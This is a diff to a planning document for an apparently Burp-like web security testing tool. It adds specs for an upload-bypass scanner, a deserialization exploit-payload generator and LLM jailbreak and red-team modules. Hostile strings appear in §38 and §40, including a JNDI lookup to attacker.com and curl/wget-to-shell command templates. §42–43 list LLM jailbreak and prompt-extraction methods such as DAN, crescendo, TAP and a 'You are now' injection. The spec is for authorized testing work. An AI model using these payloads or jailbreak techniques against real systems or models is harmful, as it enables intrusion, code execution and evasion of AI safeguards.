@@ -54,6 +54,21 @@ Comprehensive audit of `crates/` vs `crates/lancer-gui/web/src/views/` while sid
 | 31 | Plugin system | 🟡 | All hosts exist (see §20). No marketplace, no signed-plugin verification, no install-from-URL |
 | 32 | Better reports | ✅ | 6 formats + 4 issue trackers wired in backend |
 | 33 | Quality of life | ❌ | No vim/emacs keybindings, no per-project hotkey overrides, no workspace presets, no auto-snapshot, no crash recovery, no payload encyclopedia browser |
+| 38 | Upload Scanner | ❌ | NEW 2026-05-30 — file-upload bypass active check; spec at §38 |
+| 39 | API Route Discovery | ❌ | NEW 2026-05-30 — kiterunner-equivalent API-aware route enum; spec at §39 |
+| 40 | Deser. Payload Gen | ❌ | NEW 2026-05-30 — ysoserial-equivalent Java/.NET gadget chains; spec at §40 |
+| 41 | Deser. Gadget Probe | ❌ | NEW 2026-05-30 — GadgetProbe-equivalent classpath fingerprint; spec at §41 |
+| 42 | LLM Vuln Scanner | ❌ | NEW 2026-05-30 — garak-equivalent 120+ LLM probes; spec at §42 |
+| 43 | LLM Red-Team Orch. | ❌ | NEW 2026-05-30 — PyRIT-equivalent multi-turn orchestration; spec at §43 |
+| 44 | MCP Server Scanner | ❌ | NEW 2026-05-30 — MCP-scan-equivalent tool-poisoning/prompt-injection scanner; spec at §44 |
+| 45 | Shodan Enrichment | ❌ | NEW 2026-05-31 — Site Map host enrichment via Shodan; spec at §45 |
+| 46 | Unknown-Injection Scanner | ❌ | NEW 2026-05-31 — backslash-powered-scanner equivalent; spec at §46 |
+| 47 | AI Repeater Variants | ❌ | NEW 2026-05-31 — Shadow Repeater equivalent; spec at §47 |
+| 48 | Stateful API Fuzzer | ❌ | NEW 2026-05-31 — RESTler equivalent state-flaw fuzzer; spec at §48 |
+| 49 | URL Pipeline Toolkit | ❌ | NEW 2026-05-31 — qsreplace/gf/anew/uro/unfurl bundled; spec at §49 |
+| 50 | CMS-Aware Scanner | ❌ | NEW 2026-05-31 — WPScan/JoomScan/Drupal targeted checks; spec at §50 |
+| 51 | Exploit-DB Lookup | ❌ | NEW 2026-05-31 — searchsploit-equivalent local DB; spec at §51 |
+| 52 | Modules System | ❌ | NEW 2026-06-01 — opt-in module page for always-running features (JVM/Python/WASM/collab/OAST/scheduler/eBPF), default-all-off, zero idle cost; spec at §52 |
 
 # IMPLEMENTATION STATUS — 2026-05-26 UPDATE
 
@@ -134,9 +149,470 @@ Paste/import a list of hosts (or auto-derive from site map subdomains). Probe ea
 - [N] CSV / JSON / Markdown / Lancer-project export
 - [N] Diff mode: re-probe N days later, alert on new live hosts / status changes / tech changes
 
-## The 19-Tool Separate Clone Set
+---
 
-All 19 are at `./19/<toolname>/plan.md`. Each is a standalone project — Rust where practical, Go where the original is Go, Python where the domain demands it (symbolic execution, ML).
+# IMPLEMENTATION STATUS — 2026-05-30 UPDATE
+
+Cross-reference audit against the 45-tool "won't-be-made-useless-by-AI" master list (`NHTanvir/tools/readme.md`). After auditing the actual `crates/` code (not just plan markers), 10 tools were genuinely missing from both the 22-clone set and Lancer's merged feature set. Resolution:
+
+- **3 added as new D:/19/ clones** — jadx (#20), APKTool (#21), Slither (#22) — domain-specific tools that would bloat Lancer if merged
+- **7 added as new Lancer feature sections** below — §38 through §44 — proxy-native / scanner-native features that belong inside the workbench
+
+## §38 Upload Scanner `[N]` ❌
+
+Active scan check for file-upload functions. New `lancer-scanner/src/active/upload.rs`. Triggers on multipart/form-data requests or any endpoint that accepts `Content-Type: image/*`, `application/pdf`, etc.
+
+- [N] Detect file-upload endpoints from request analysis (multipart boundaries, Content-Disposition with filename, FileReader-style API calls)
+- [N] Test extension blacklist bypass: `shell.php.jpg`, `shell.pHp`, `shell.php%00.jpg`, `shell.php;jpg`, `shell.php5/.phtml/.phar/.pht/.phps`
+- [N] Test MIME-type spoofing: upload PHP with `Content-Type: image/jpeg`
+- [N] Test magic-byte prepending: `\xff\xd8\xff\xe0` (JPEG header) + PHP body
+- [N] Polyglot uploads: GIFAR (GIF + JAR), JPEG with embedded XML/SVG
+- [N] SVG with embedded `<script>` (XSS via uploaded SVG)
+- [N] Path traversal in filename: `../../../shell.php`, `..\..\shell.aspx`
+- [N] Filename injection: `${jndi:ldap://attacker.com/x}` (log4shell-style)
+- [N] Race condition: rapid upload + access before validator deletes the file
+- [N] Content-Type confusion: server validates by header, parses by extension
+- [N] Stored-XSS test via uploaded HTML/SVG/PDF (with embedded JS)
+- [N] DoS test: zip-bomb upload (configurable threshold so we don't actually DoS)
+- [N] One-click "extract upload endpoint to §39 API Route Discovery" for further fuzzing
+- [N] Integration with §6 Collaborator: upload a `.php` that pings the OOB server (confirms code execution)
+
+## §39 API Route Discovery `[N]` ❌
+
+API-aware route discovery (kiterunner equivalent). New `lancer-scanner/src/api_routes.rs` + `lancer-tools/src/route_discover.rs`. Beats dir-bruteforce on REST APIs because it knows route templates, common verbs, and content negotiation.
+
+- [N] Route schema database: 10,000+ known API route templates extracted from OpenAPI specs, Postman collections, GitHub crawls, GraphQL schemas
+- [N] Schema groups: `aws/`, `gcp/`, `azure/`, `k8s/`, `stripe/`, `twilio/`, `github/`, `gitlab/`, `slack/`, generic REST patterns (`/api/v{1..3}/{resource}`, `/api/{resource}/{id}/{subresource}`)
+- [N] Method fanout: every discovered route is probed with GET/POST/PUT/PATCH/DELETE/OPTIONS/HEAD
+- [N] Content-Type fanout: `application/json`, `application/xml`, `application/x-www-form-urlencoded`, `multipart/form-data`
+- [N] Header fanout: `Accept: application/json` vs `Accept: */*` (some APIs only respond with JSON requested)
+- [N] Smart distinguishment: 200 with body length variance > σ vs all-uniform-404
+- [N] OpenAPI/Swagger spec auto-detection: if `/swagger.json`, `/openapi.json`, `/api-docs`, `/v2/api-docs` returns valid JSON, switch to spec-driven mode (zero noise)
+- [N] GraphQL introspection: `/graphql`, `/api/graphql`, `/query`
+- [N] Versioned API enumeration: try `/v1`, `/v2`, `/v3` automatically
+- [N] Auth bypass cross-probe: discover route → re-test with §36 Auth Bypass Module
+- [N] Reuses §4.6 Mass Fuzz Mode tokio HTTP client (HTTP/2 multiplexing for free)
+- [N] Output: discovered routes → §2.1 Site Map + §19 Findings (if unauth + sensitive)
+- [N] AI route prediction: paste a few discovered endpoints, `lancer-ai` predicts more (e.g., found `/api/users` and `/api/orders` → predicts `/api/payments`, `/api/refunds`)
+
+## §40 Deserialization Payload Generator `[N]` ❌
+
+Java/.NET deserialization gadget-chain payload generator (ysoserial equivalent). New `lancer-tools/src/deser_payload.rs` + `lancer-cli/src/commands/ysoserial.rs`. Distinct from §5.2 deserialization *detection* — this generates exploit payloads.
+
+- [N] Java gadget chains: `CommonsCollections1-7`, `CommonsBeanutils1`, `Spring1`, `Spring2`, `Groovy1`, `Hibernate1-2`, `JBossInterceptors1`, `JSON1`, `MozillaRhino1-2`, `Vaadin1`, `Click1`, `Clojure`, `JavassistWeld1`, `JdkUtil`, `ROME`, `Wicket1`, `URLDNS` (detection-only)
+- [N] .NET gadget chains: `TypeConfuseDelegate`, `TextFormattingRunProperties`, `ResourceSet`, `ActivitySurrogateSelector`, `BinaryFormatter`, `SoapFormatter`, `Json.NET`, `ObjectStateFormatter`, `LosFormatter`, `WindowsIdentity`
+- [N] Payload encoding: raw bytes / base64 / hex / URL-encoded / form-encoded
+- [N] Command payload templates: `cmd /c calc.exe`, `bash -c "curl <collab>/$(whoami)"`, `wget -O- <collab> | sh`, OS-aware fallback
+- [N] Collaborator integration: auto-substitute `<collab>` with a fresh §6 Collaborator payload, then watch for callback
+- [N] One-click "send payload into selected request body" in Repeater
+- [N] One-click "use as Intruder payload set" (mass-test all chains against a single endpoint)
+- [N] Library fingerprint linking: if §41 GadgetProbe found `commons-collections:3.1` → suggest `CommonsCollections1`/`CommonsCollections5`
+- [N] CLI: `lancer-cli ysoserial --chain CommonsCollections1 --cmd 'curl <collab>/x' --encode base64`
+- [N] No malicious payload execution against unauthorized targets — gate behind explicit `--target-authorized` flag
+
+## §41 Deserialization Gadget Probe `[N]` ❌
+
+Detects which Java deserialization gadgets/libraries a target classpath exposes (GadgetProbe equivalent). New `lancer-scanner/src/active/gadget_probe.rs`.
+
+- [N] Send serialized objects that reference specific class names + a Collaborator-pingback payload as the value
+- [N] If the target classpath contains that class, the deserialization triggers the pingback → confirmed presence
+- [N] Probe library: 200+ class names from popular Java libraries (`org.apache.commons.collections.functors.InvokerTransformer`, `org.codehaus.groovy.runtime.MethodClosure`, `bsh.XThis`, `com.sun.rowset.JdbcRowSetImpl`, `org.springframework.beans.factory.ObjectFactory`, etc.)
+- [N] Version fingerprinting: differential class presence pins library to a version range
+- [N] Auto-chain into §40 Payload Generator: discovered library → suggest matching gadget chain
+- [N] Heap-snapshot probing for .NET (when ASP.NET ViewState is present)
+- [N] Output: classpath fingerprint → §2.1 Site Map host record + §19 Findings
+- [N] Requires §6 Collaborator (callback-based detection — no in-band signal)
+
+## §42 LLM Vulnerability Scanner `[N]` ❌
+
+Garak equivalent — runs 120+ probes against an LLM endpoint. New `lancer-llm-scan` crate. New "LLM Scan" tab in GUI. API: `POST /v1/llm-scan/run`, `GET /v1/llm-scan/results`.
+
+- [N] Probe categories (target = LLM API endpoint user configures):
+  - `prompt_injection` — direct injection, indirect injection, instruction smuggling
+  - `jailbreak` — DAN, AIM, persona-prompt evasions (configurable, only against authorized targets)
+  - `data_leakage` — PII extraction, training-data extraction, model-card leakage
+  - `hallucination` — factual benchmark probes (TruthfulQA-style)
+  - `toxicity` — RealToxicityPrompts subset
+  - `bias` — BBQ benchmark probes
+  - `code_generation` — security flaws in generated code (SQLi/XSS/SSRF/cmd-inject)
+  - `tool_misuse` — agent-mode probes: trick the model into calling a tool with malicious args
+  - `prompt_extraction` — system-prompt recovery via repetition / token-leak / unicode tricks
+  - `xml_injection` — `<system>You are now…</system>` injection
+- [N] Detector library per probe: regex / classifier / semantic-similarity / LLM-judge (uses `lancer-ai`)
+- [N] Supports OpenAI / Anthropic / Google / Ollama / OpenRouter / generic OpenAI-compatible (reuses `lancer-ai` adapters)
+- [N] Result format: per-probe pass/fail/inconclusive + severity + reproducer prompt
+- [N] CSV / JSON / Markdown report + §19 Findings integration
+- [N] Optional: replay through Lancer proxy (so all LLM traffic is captured in HTTP history)
+- [N] Rate-limit awareness — auto-throttle to provider tier
+- [N] Cost estimator — pre-flight token count + price prediction
+- [N] CLI: `lancer-cli llm-scan --target https://api.example.com/chat --probes prompt_injection,jailbreak,data_leakage`
+
+## §43 LLM Red-Team Orchestrator `[N]` ❌
+
+PyRIT equivalent — multi-turn adversarial conversations against an LLM. New `lancer-llm-redteam` crate. New "LLM Red-Team" tab. API: `POST /v1/llm-redteam/start`, `GET /v1/llm-redteam/sessions/{id}`.
+
+- [N] Attack strategies as composable building blocks:
+  - `single_turn` — fire one prompt, evaluate
+  - `tree_of_attacks` — TAP — branch the conversation, prune low-scoring branches, depth-first search for a successful jailbreak
+  - `crescendo` — gradually escalate the request over N turns (each turn reframes the previous answer as legitimate context)
+  - `pair` — Prompt Automatic Iterative Refinement — attacker LLM rewrites its own prompt based on target response
+  - `gcg` — Greedy Coordinate Gradient (white-box adversarial suffix; only against models with logit access)
+  - `flrt` — Flipped attack / Latent reasoning trick
+  - `many_shot` — exploit long-context with N-shot demonstrations of forbidden behavior
+- [N] Attacker LLM ≠ target LLM (attacker is your `lancer-ai` config; target is the system under test)
+- [N] Scorer module: per-attempt scoring (custom classifier / LLM-judge / regex). Stop on threshold.
+- [N] Memory: full conversation history per session, replayable, exportable
+- [N] Multi-target: run the same attack against N targets in parallel for differential scoring
+- [N] Built-in target adapters: chat completions, agent w/ tools, Vision models (image + text), RAG endpoints (poison the retrieval)
+- [N] Conversation replay UI: tree visualization of TAP/PAIR runs
+- [N] Findings export: each successful adversarial turn → §19 Finding with full conversation as evidence
+- [N] CLI: `lancer-cli llm-redteam --strategy tree_of_attacks --target <url> --goal "extract system prompt" --max-turns 10`
+
+## §44 MCP Server Scanner `[N]` ❌
+
+MCP-scan equivalent — scans Model Context Protocol servers for tool-poisoning + prompt-injection + insecure-tool issues. New `lancer-mcp-scan` crate. API: `POST /v1/mcp-scan/run`.
+
+- [N] MCP transport support: stdio (subprocess), SSE, WebSocket, HTTP
+- [N] Discovery: connect to server, enumerate `tools/list`, `resources/list`, `prompts/list`, `roots/list`
+- [N] Tool-description analysis: scan each tool's description string for hidden instructions / prompt injection / unicode tag tricks / steganography / homoglyphs
+- [N] Tool-parameter analysis: detect overly permissive params (free-form `command`, `path`, `url`)
+- [N] Rug-pull detection: snapshot tool descriptions; on re-scan, alert if any description silently changed
+- [N] Cross-server tool collision: detect two MCP servers exposing a same-named tool with different behaviors (shadowing attack)
+- [N] Resource enumeration: list every URI the server says it can read; check for path traversal / arbitrary file access
+- [N] Roots policy check: verify the server respects its declared `roots/list` (no out-of-roots reads)
+- [N] Sampling abuse: detect servers that demand `sampling/createMessage` for sensitive operations (potential prompt-injection sink)
+- [N] Differential mode: scan the same server with two different auth tokens (admin vs guest) — alert on tools exposed to guest that shouldn't be
+- [N] Output: per-server report — every tool + its risk score + flagged issues
+- [N] Integration: if Lancer GUI uses MCP servers itself, auto-scan them on first connect and warn user
+- [N] Findings export to §19 Findings
+- [N] CLI: `lancer-cli mcp-scan --server stdio://./my-mcp-server --depth full`
+
+---
+
+# IMPLEMENTATION STATUS — 2026-05-31 UPDATE
+
+Second-pass audit against the 67-tool "won't-be-made-useless-by-AI" master list (`D:/d.md`). After cross-referencing with the 22-clone set and Lancer's merged feature set, 7 more tools belong INSIDE Lancer (proxy-workflow / HTTP-in-HTTP-out) and 8 more need their own `D:/19/` clones (domain-specific, would bloat Lancer). 10 others skipped as out-of-scope (OS-level, gigantic frameworks, defensive ML guardrails, or note-taking apps).
+
+## §45 Shodan Host Enrichment `[N]` ❌
+
+Right-click any host in §2.1 Site Map → "Shodan lookup" → inline Shodan data without leaving Lancer. New `lancer-shodan` crate (~300 LOC, thin API client). API: `GET /v1/shodan/{host}`, `GET /v1/shodan/cves/{cve}`.
+
+- [N] Shodan REST API client with `SHODAN_API_KEY` env var auth
+- [N] `host(ip)` → ports / banners / hostnames / OS / vulns / tags / last_update
+- [N] `cve(cve_id)` → CVSS / EPSS / KEV flag / references
+- [N] `search(query)` → first-N results (paginated)
+- [N] Per-host cache (24h TTL) so re-opening a Site Map node doesn't burn API quota
+- [N] Inline detail pane in §2.1 host detail showing Shodan banner + open ports highlighted
+- [N] Right-click → "Shodan search /facets" for tag-based pivoting (e.g., `org:"Cloudflare"`)
+- [N] Auto-mark hosts as "internet-exposed" in Lancer scope if Shodan has a record
+- [N] Optional InternetDB free-tier fallback (no key required, smaller dataset)
+- [N] CVE column in §19 Findings auto-enriched with Shodan KEV/EPSS data
+
+## §46 Unknown-Injection Scanner `[N]` ❌
+
+Active scan check that finds **unknown** classes of injection by response-diffing the target. New `lancer-scanner/src/active/backslash_powered.rs`. Equivalent to James Kettle's backslash-powered-scanner Burp extension.
+
+- [N] Send probe payloads designed to break parsers in distinctive ways: `\`, `\\`, `\0`, `''`, `""`, `${`, `{{`, `<%`, `[`, `]`, `(`, `)`, `&apos;`, `&#39;`, ``, `\xff`, `\n`, `\r\n`, mixed quote styles
+- [N] Diff each response against baseline: status, length, render time, headers, body word frequency, error-message presence
+- [N] Statistical scoring: an injection point is anomalous if response signature for `\` differs significantly from baseline AND from `\\` (parser error) but matches for benign escapes
+- [N] Build issue with "unknown injection class — manual investigation required" + diff evidence
+- [N] Per-position scoring across URL params, body, headers, cookies, JSON keys, path segments
+- [N] Reuse §6 Collaborator for blind variants (payload that pings collab if interpolated)
+- [N] AI-assist mode: feed the anomalous diff to `lancer-ai`, ask "what injection class is this?" — confidence-scored hypothesis
+- [N] One-click "send to Repeater" with the most-divergent payload pre-loaded for manual exploitation
+- [N] Integration with §19 Findings: even low-confidence anomalies are saved for triage
+
+## §47 AI Repeater Variants `[N]` ❌
+
+Extends §16 Burp AI in Repeater. PortSwigger's Shadow Repeater equivalent. Wired into existing `lancer-ai`. New "Shadow" toggle in Repeater toolbar.
+
+- [N] Each time the user clicks Send manually, an LLM background pass generates 3-5 mutation variants (param value tweaks, header additions, encoding changes, case flips, path traversal additions)
+- [N] Variants run in the background through the same proxy, their responses scored against the baseline
+- [N] If a variant's response substantially differs (200 → 500, length jump, new error revealed), surface as a "shadow hit" notification
+- [N] User can promote any shadow variant to a real Repeater tab with one click
+- [N] Mutation strategy panel: pick which families to use (auth bypass / IDOR / injection / encoding / parameter pollution)
+- [N] Per-tab on/off toggle (shadow mode burns LLM credits — opt-in)
+- [N] Cost meter in toolbar (LLM tokens spent on shadow this session)
+- [N] Cached suggestions — same baseline request hash reuses the previous mutation set
+- [N] CLI: `lancer-cli shadow <request.http>` — one-shot variant generation outside the GUI
+
+## §48 Stateful API Fuzzer `[N]` ❌
+
+Multi-step API request sequences for state-flaw detection (RESTler equivalent). New `lancer-stateful-fuzz` crate. New "Stateful Fuzz" tab in Scanner. API: `POST /v1/stateful-fuzz/start`, `GET /v1/stateful-fuzz/sessions/{id}`.
+
+- [N] Input: OpenAPI/Swagger spec (auto-detected from /openapi.json or user upload) — extracts request grammar + response → param dependencies
+- [N] Sequence inference: detect that `POST /users` returns `{id}` that subsequent `GET /users/{id}` needs — auto-chain them
+- [N] Stateful fuzzing modes:
+  - `production-safe` — read-only (GET) endpoints only
+  - `sequence` — every spec'd ordered call sequence
+  - `cluster-bomb` — cartesian product of param values across sequence positions
+  - `mutate-mid-sequence` — corrupt one mid-sequence value, observe downstream behavior
+- [N] State-flaw detectors:
+  - **Access-control fault**: created resource accessible by other users after delete
+  - **Use-after-free**: resource deleted then read returns 200 instead of 404
+  - **Privilege state retention**: role downgrade doesn't strip earlier-grant scope
+  - **Workflow skip**: step 2 reachable without step 1 (e.g., `/checkout` without prior `/cart/add`)
+- [N] Reuses §17 Session Handling for auth (multi-user pitchfork: User A creates, User B reads)
+- [N] Reuses §6 Collaborator for blind state-flaw probes
+- [N] CLI: `lancer-cli stateful-fuzz --spec openapi.json --auth-token <token>`
+- [N] Output: sequence graphs (PlantUML / Mermaid), found flaws → §19 Findings with full request chain as evidence
+
+## §49 URL Pipeline Toolkit `[N]` ❌
+
+Bundle tiny CLI utilities that everyone uses in recon pipelines (qsreplace / gf / anew / uro / unfurl). Each is <200 LOC. New module `lancer-cli/src/commands/urls.rs` exposing all five as subcommands.
+
+- [N] `lancer-cli url qsreplace <NEW_VALUE>` — replace every query-string value with `<NEW_VALUE>` (e.g., `qsreplace 'lancer'` injects a probe into every param)
+- [N] `lancer-cli url gf <PATTERN>` — grep for predefined patterns from `~/.lancer/patterns/` (gf-format pattern files: `xss.json`, `sqli.json`, `ssrf.json`, `redirect.json`, etc.); ship 30+ standard patterns
+- [N] `lancer-cli url anew <FILE>` — stream-dedup: print only lines not already in `<FILE>`, append to file
+- [N] `lancer-cli url uro` — normalize URLs (remove sessions/tracking params, lowercase host, sort query, trim trailing slash); drops near-duplicate URLs
+- [N] `lancer-cli url unfurl <PART>` — extract domain / path / query / scheme / fragment / port from a URL stream
+- [N] All five accept stdin, emit stdout — chainable: `cat urls.txt | lancer-cli url uro | lancer-cli url gf xss | lancer-cli url qsreplace '"><svg' | lancer-cli url anew tested.txt`
+- [N] Reuses Lancer's URL parser (one codebase) so behavior is consistent with Proxy/Scanner/Intruder
+- [N] Each pattern is JSON: `{name, regex, flags, description}` — drop-in compatible with tomnomnom's gf
+- [N] Pattern auto-update from a curated GitHub repo (optional, off by default)
+
+## §50 CMS-Aware Scanner `[N]` ❌
+
+WPScan / JoomScan / Drupal-aware Lancer active scanner. Triggers when passive software_disclosure detects a CMS. New `lancer-scanner/src/active/cms/` directory.
+
+- [N] **WordPress** sub-scanner:
+  - Detect version from `readme.html`, `meta generator`, `feed?`, `wp-includes/version.php`
+  - Enumerate users via `/wp-json/wp/v2/users`, `/?author=<n>` redirect, REST API
+  - Enumerate plugins (top 1000 by install count, probed via `/wp-content/plugins/<slug>/`)
+  - Enumerate themes
+  - Plugin/theme CVE matching from bundled DB (WPScan-feed-compatible)
+  - Detect WP-Cron exposure, xmlrpc.php abuse vectors, REST API leaks
+  - Check for known weak/default credentials (login bruteforce — gated behind authorization flag)
+- [N] **Joomla** sub-scanner:
+  - Detect version from `administrator/manifests/files/joomla.xml`, `language/en-GB/en-GB.xml`
+  - Component enumeration (com_*), template enumeration
+  - Known CVE matching per component+version
+  - Detect SQL injections in old com_* extensions (curated DB)
+- [N] **Drupal** sub-scanner:
+  - Detect version from `CHANGELOG.txt`, `core/CHANGELOG.txt`, `/core/install.php`
+  - Module enumeration (top 500), theme enumeration
+  - Drupalgeddon family probes (CVE-2018-7600, etc.)
+- [N] **Generic CMS** — Magento, Shopify, Wix, Webflow, Ghost, Strapi, Sanity, Contentful — basic version detection + known-issue lookup
+- [N] CMS-finding deduplication into §19 Findings with CMS + version + CVE links
+- [N] Vuln DB pulled from official WPScan / Joomla / Drupal sources at first run, cached locally (~50 MB)
+- [N] CLI: `lancer-cli cms-scan https://target.com`
+
+## §51 Exploit-DB Lookup `[N]` ❌
+
+Right-click any §19 Finding with a CVE → "Show known exploits" — local exploit-db SQLite, offline. searchsploit / getsploit equivalent. New `lancer-exploitdb` crate. API: `GET /v1/exploits/by-cve/{cve}`, `GET /v1/exploits/by-keyword/{q}`.
+
+- [N] Ships with a bundled `exploitdb.sqlite` (downloaded on first run from offensive-security/exploitdb mirror, ~60 MB)
+- [N] Index columns: `cve`, `edb_id`, `title`, `author`, `date`, `platform`, `type`, `port`, `path`, `verified`
+- [N] Query interface:
+  - by CVE: returns all EDB entries citing this CVE
+  - by keyword: full-text search across titles + descriptions
+  - by software + version: regex-match the bundled "exploits/<plat>/<type>/" tree
+- [N] Display panel: each result shows title, date, type (webapps / remote / local / dos / shellcode / papers), severity, link to local exploit code
+- [N] Auto-link in §19 Findings: any finding with a CVE auto-shows exploit-db hits inline
+- [N] Auto-link in §28 WAF / §5.7 Templates: known-CVE templates surface matching exploits
+- [N] Right-click any exploit → "View source" (opens local file) / "Copy as raw" / "Send shellcode to Decoder" / "Send web exploit to Repeater" (parses HTTP-style exploits and pre-fills a Repeater tab)
+- [N] Update command: `lancer-cli exploits update` — pulls latest exploit-db diff (~few MB / month)
+- [N] CLI: `lancer-cli exploits search "wordpress 5.8"` / `lancer-cli exploits cve CVE-2024-12345`
+
+---
+
+# IMPLEMENTATION STATUS — 2026-06-01 UPDATE
+
+Performance-focused redesign. Lancer's identity is "lighter than Burp and Caido." All features that **run continuously in the background** (consuming RAM / CPU even when the user isn't actively using them) become **opt-in modules** under a new `Settings → Modules` page. When a module is OFF, its code does not execute — no async task is scheduled, no subprocess is spawned, no kernel probe is attached. Toggle ON only what you need.
+
+## §52 Modules System `[N]` ❌
+
+Modular runtime architecture so Lancer starts at **~80MB resident** with all heavy features dormant. User opts in per module from a single GUI page. First-run defaults: **everything OFF**.
+
+### Core trait
+
+```rust
+pub trait LancerModule: Send + Sync + 'static {
+    fn id(&self) -> &'static str;
+    fn name(&self) -> &'static str;
+    fn description(&self) -> &'static str;
+    fn category(&self) -> ModuleCategory;
+    fn estimated_idle_ram_kb(&self) -> u64;
+    fn platform_supported(&self) -> bool;          // hide eBPF on non-Linux, JVM if no JRE on PATH
+    fn requires_elevation(&self) -> bool;          // eBPF needs sudo/Admin
+    async fn start(&self) -> anyhow::Result<ModuleHandle>;
+    async fn stop(handle: ModuleHandle) -> anyhow::Result<()>;
+    fn live_status(handle: &ModuleHandle) -> ModuleStatus;
+}
+
+pub enum ModuleCategory { PluginRuntime, NetworkService, Background, Platform }
+
+pub enum ModuleStatus {
+    Off,                                             // not running, zero cost
+    Starting,
+    Running { pid: Option<u32>, ram_kb: u64, since: Instant },
+    Stopping,
+    Failed(String),
+}
+```
+
+A `ModuleRegistry` holds every registered `LancerModule`. The Settings GUI page enumerates the registry, shows status, and toggles via `start()` / `stop()`.
+
+### Three module flavors
+
+**A) In-process task module** (cheapest)
+- Toggle ON → `tokio::spawn(task())`, store the `JoinHandle` + `CancellationToken`.
+- Toggle OFF → cancel the token; the task exits; memory drops to baseline.
+- Used for: **collab, oast-server, scheduler, webhook-notifier**.
+- **Idle cost when OFF: literally zero.** The task isn't scheduled. No code runs.
+
+**B) Subprocess module** (heavy runtimes — isolate them from Lancer's address space)
+- A separate binary lives next to `lancer.exe` (e.g. `lancer-jvm-host.exe`, `lancer-python-host.exe`, `lancer-wasm-host.exe`).
+- Toggle ON → main Lancer spawns the child + sets up IPC (JSON-RPC over stdin/stdout or a local named pipe / UNIX socket).
+- Toggle OFF → send `{"method":"shutdown"}`, child exits, **the OS reclaims all the RAM** (libpython3, JVM heap, wasmtime engine — all gone).
+- Used for: **jvm, python, wasm**.
+- **Idle cost when OFF: zero. The child process literally doesn't exist.**
+- **Bonus crash isolation**: if the JVM segfaults or a malicious Python plugin loops forever, Lancer keeps running. Auto-restart configurable.
+
+**C) Privileged daemon module** (eBPF)
+- Subprocess + `sudo` prompt on first start.
+- Toggle ON → spawn `lancer-ebpf-probe` with elevated permissions; it loads the BPF programs into the kernel.
+- Toggle OFF → SIGTERM the probe; kernel detaches every program; **zero kernel overhead**.
+
+### The 7 modules (first batch)
+
+| ID | Name | Category | Flavor | Idle RAM when ON | Idle RAM when OFF |
+|----|------|----------|--------|------------------|-------------------|
+| `jvm` | JVM plugin host | PluginRuntime | Subprocess | 80-130MB | 0 |
+| `python` | Python plugin host | PluginRuntime | Subprocess | 12-20MB | 0 |
+| `wasm` | WASM plugin host | PluginRuntime | Subprocess | 6-10MB | 0 |
+| `collab` | Live multi-tester sync | NetworkService | In-process | 2-4MB | 0 |
+| `oast-server` | Self-hosted Collaborator | NetworkService | In-process | 4-8MB | 0 |
+| `scheduler` | Cron / scheduled scans | Background | In-process | 1-2MB | 0 |
+| `ebpf` | Kernel-level capture (Linux) | Platform | Privileged daemon | 10-15MB | 0 |
+
+**Sum if everything is ON: ~200MB. Sum if everything is OFF: 0 above Lancer baseline (~80MB).**
+
+### Settings → Modules GUI
+
+A new tab under Settings, single screen:
+
+```
+┌─────────────────────────────────────────────────────────────────────────┐
+│  Settings ▸ Modules                                                     │
+├─────────────────────────────────────────────────────────────────────────┤
+│                                                                         │
+│   PLUGIN RUNTIMES                                                       │
+│   ───────────────                                                       │
+│   ⬜ JVM         Java/Kotlin plugin host       est. 80MB   [Off ▾]   ●  │
+│   ⬜ Python      Python plugin host            est. 15MB   [Off ▾]   ●  │
+│   ⬜ WASM        WebAssembly plugin host       est.  8MB   [Off ▾]   ●  │
+│                                                                         │
+│   NETWORK SERVICES                                                      │
+│   ────────────────                                                      │
+│   ⬜ Collab      Live multi-tester sync        est.  3MB   [Off ▾]   ●  │
+│   ⬜ OAST        Self-hosted Collaborator      est.  5MB   [Off ▾]   ●  │
+│                                                                         │
+│   BACKGROUND                                                            │
+│   ──────────                                                            │
+│   ⬜ Scheduler   Cron / scheduled scans        est.  1MB   [Off ▾]   ●  │
+│                                                                         │
+│   PLATFORM  (Linux only — requires root)                                │
+│   ───────────────────────────────────────                               │
+│   ⬜ eBPF        Kernel-level traffic capture  est. 12MB   [Off ▾]   ●  │
+│                                                                         │
+│   ─────────────────────────────────────────────────────────────         │
+│   Current Lancer resident:   82 MB                                      │
+│   Sum if all enabled:       ~204 MB                                     │
+│   [Reset all to Off]   [Save snapshot]   [Load snapshot]                │
+└─────────────────────────────────────────────────────────────────────────┘
+```
+
+- Per-row: checkbox toggle, name, description, estimated RAM, status dropdown (`Off` / `On` / `Auto`), live status dot (●green=running, ●grey=off, ●red=failed).
+- Toolbar at bottom: current actual RAM, projected RAM if all on, snapshot save/load (preset module configs — e.g. "Web pentest" / "Mobile pentest" / "Cloud pentest" presets).
+- `Auto` mode (per module): enable on first usage attempt, disable after N minutes idle. Smart toggling.
+- Crashed modules show a 🔄 retry button and surface stderr in a collapsible panel.
+
+### Persistence
+
+Per-module preference stored in `~/.config/lancer/modules.toml`:
+
+```toml
+[modules.jvm]
+state = "off"               # off | on | auto
+
+[modules.python]
+state = "auto"
+auto_idle_timeout_min = 5
+
+[modules.ebpf]
+state = "off"
+sudo_method = "pkexec"      # pkexec | sudo | doas
+```
+
+### CLI parity
+
+```
+lancer-cli modules list                        # show every module + status
+lancer-cli modules enable <id>                 # turn on (persistent)
+lancer-cli modules disable <id>                # turn off (persistent)
+lancer-cli modules status                      # live RAM/CPU per running module
+lancer-cli modules preset save <name>          # snapshot current toggle states
+lancer-cli modules preset load <name>          # restore
+```
+
+### API
+
+```
+GET    /v1/modules                             # list all registered modules + status
+POST   /v1/modules/{id}/start
+POST   /v1/modules/{id}/stop
+GET    /v1/modules/{id}/status                 # live (RAM kb, CPU %, since)
+PUT    /v1/modules/{id}/config                 # per-module config (timeouts, sudo method, etc.)
+GET    /v1/modules/presets
+POST   /v1/modules/presets/{name}
+```
+
+### Subprocess IPC protocol
+
+For runtime-host subprocess modules (JVM/Python/WASM), Lancer talks JSON-RPC 2.0 over the child's stdin/stdout:
+
+```json
+→ {"jsonrpc":"2.0","id":1,"method":"hello","params":{"lancer_version":"1.0"}}
+← {"jsonrpc":"2.0","id":1,"result":{"runtime":"jvm","version":"21.0.5+11"}}
+
+→ {"jsonrpc":"2.0","id":2,"method":"load_plugin","params":{"path":"/.../foo.jar"}}
+← {"jsonrpc":"2.0","id":2,"result":{"plugin_id":"foo","entry":"com.foo.Main"}}
+
+→ {"jsonrpc":"2.0","id":3,"method":"invoke","params":{"plugin":"foo","hook":"onRequest","arg":{"...":"..."}}}
+← {"jsonrpc":"2.0","id":3,"result":{"modified":true,"payload":"..."}}
+
+→ {"jsonrpc":"2.0","id":4,"method":"shutdown"}
+← (child process exits cleanly)
